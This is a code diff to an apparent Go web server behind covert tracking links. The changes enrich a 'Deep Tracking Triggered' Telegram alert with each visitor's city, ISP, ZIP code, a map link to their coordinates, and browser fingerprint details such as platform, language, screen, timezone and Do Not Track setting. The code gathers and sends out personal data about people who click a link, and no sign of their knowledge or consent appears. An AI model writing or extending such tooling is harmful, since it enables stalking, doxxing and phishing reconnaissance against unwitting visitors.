@@ -24,7 +24,7 @@ type LinkData struct {
 type TrackData struct {
 	ID          string                   `json:"id"`
 	Fingerprint map[string]interface{}   `json:"fingerprint"`
-	Geo         interface{}              `json:"geo"`
+	Geo         map[string]interface{}   `json:"geo"`
 	Events      []map[string]interface{} `json:"events"`
 	Duration    int64                    `json:"duration"`
 }
@@ -94,12 +94,22 @@ func trackDeepData(c *gin.Context) {
 	defer f.Close()
 	f.WriteString(entry)
 
-	summary := fmt.Sprintf("📍 *Deep Tracking Triggered!*\nID: `%s`\nBrowser: `%s`\nDuration: `%dms`\nClicks/Moves: `%d`%s",
+	geoSummary := fmt.Sprintf("\nLocation: %s, %s (%s)\nISP: %s\nRegion: %s\nOrg: %s\nZIP: %s\nCoords: https://www.google.com/maps?q=%v,%v",
+		data.Geo["city"], data.Geo["country"], data.Geo["countryCode"],
+		data.Geo["isp"], data.Geo["regionName"], data.Geo["org"], data.Geo["zip"],
+		data.Geo["lat"], data.Geo["lon"])
+
+	fp := data.Fingerprint
+	fpDetails := fmt.Sprintf("\n\n🧠 *Fingerprint Info:*\nUser-Agent: `%s`\nPlatform: `%s`\nLang: `%s`\nScreen: `%s`\nTouch: `%v`\nDNT: `%v`\nTimezone: `%s`",
+		fp["userAgent"], fp["platform"], fp["language"], fp["screen"], fp["touchSupport"], fp["dnt"], fp["timezone"])
+
+	summary := fmt.Sprintf("📍 *Deep Tracking Triggered!*\nID: `%s`\nDuration: `%dms`\nClicks/Moves: `%d`%s%s%s",
 		data.ID,
-		data.Fingerprint["userAgent"],
 		data.Duration,
 		len(data.Events),
-		vpnLabel)
+		vpnLabel,
+		geoSummary,
+		fpDetails)
 
 	sendTelegramMessage(summary)
 	c.JSON(http.StatusOK, gin.H{"status": "tracked"})
@@ -122,7 +132,7 @@ func redirectHandler(c *gin.Context) {
 		return
 	}
 
-	c.Redirect(http.StatusTemporaryRedirect, fmt.Sprintf("/track/%s", id))
+	c.Redirect(http.StatusTemporaryRedirect, fmt.Sprintf("%s/track/%s", linkPrefix, id))
 }
 
 func main() {
